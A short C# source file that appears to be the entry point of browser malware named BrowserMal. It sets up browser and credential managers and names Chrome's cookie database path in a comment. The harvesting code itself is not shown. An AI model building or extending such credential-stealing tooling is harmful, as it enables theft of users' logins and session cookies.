using BrowserMal.Browser;
using BrowserMal.Credential;

namespace BrowserMal
{
    public class Class1
    {
        //private static string COOKIES_DATA_PATH = "\\Google\\Chrome\\User Data\\Default\\Network\\Cookies";

        private static readonly BrowserManager browserManager = new BrowserManager();
        private static readonly CredentialManager credentialManager = new CredentialManager();

        public static void Start()
        {
            browserManager.Init();
            credentialManager.Init(browserManager.GetBrowsers());
        }
    }
}
